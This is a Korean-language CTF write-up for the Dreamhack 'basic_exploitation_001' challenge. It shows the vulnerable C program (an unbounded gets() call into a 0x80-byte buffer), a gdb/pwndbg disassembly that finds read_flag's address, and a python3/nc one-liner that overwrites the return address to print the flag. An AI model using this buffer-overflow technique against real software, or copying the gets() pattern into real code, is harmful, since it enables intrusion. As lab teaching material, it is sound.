```c
// Name: basic_exploitation_001.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}
```

`basic_exploitation_001.c` 코드를 읽어보면, `read_flag` 함수를 실행시키면 flag를 얻을 수 있으리라는 사실을 알 수 있다.
따라서 `main` 함수의 Return Address를 `read_flag`의 주소로 바꿔주면 flag를 얻을 수 있을 것이다.
또한, `gets(buf);`에서 입력 크기를 제한하지 않는다는 취약점이 있음을 알 수 있다.
그러니 이를 공략하자.

일단, `stdin`으로 넘겨줘야 하는 문자열을 구성하기 위해선 `read_flag`의 주소를 알아낼 필요가 있다.

```bash
$ gdb -q basic_exploitation_001
pwndbg: loaded 152 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from basic_exploitation_001...
(No debugging symbols found in basic_exploitation_001)
------- tip of the day (disable with set show-tips off) -------
heap_config shows heap related configuration
pwndbg> disassemble read_flag
Dump of assembler code for function read_flag:
   0x080485b9 <+0>:     push   ebp
   0x080485ba <+1>:     mov    ebp,esp
   0x080485bc <+3>:     push   0x8048679
   0x080485c1 <+8>:     call   0x8048410 <system@plt>
   0x080485c6 <+13>:    add    esp,0x4
   0x080485c9 <+16>:    nop
   0x080485ca <+17>:    leave
   0x080485cb <+18>:    ret
End of assembler dump.
pwndbg>
```

따라서 `read_flag` 함수의 주소는 `0x080485b9`임을 알 수 있으며, Return Address 자리에 `b'\xb9\x85\x04\x08'`을 채워주면 flag를 얻을 수 있다.
또한, `basic_exploitation_001.c`의 `main` 함수에서 선언된 변수가 `0x80`바이트 길이의 배열 `buf` 뿐이며, 스택은 `0x10`바이트 단위로 정렬되어야 하므로, `0x80`바이트의 공간이 할당되며, 그 뒤 `0x4`바이트가 SFP, 그 뒤 `0x4`바이트가 Return Address이다.
즉, `stdin`으로 넘겨줘야 할 문자열의 첫 `0x84`바이트의 내용은 상관 없으며, 그 뒤 `0x4`바이트를 `b'\xb9\x85\x04\x08'`로 채워주면 flag를 얻을 수 있다.

다음 명령어를 입력하면 서버에 연결한 후 `stdin`으로 넘겨줄 문자열이 버퍼에 저장되게 된다.
따라서 다음 명령어를 입력한 후 엔터를 한 번 더 눌러주면 flag를 얻을 수 있다.

```bash
$ (python3 -c "import sys; sys.stdout.buffer.write(b'A' * 0x84 + b'\xb9\x85\x04\x08')"; cat) | nc host3.dreamhack.games <port>
```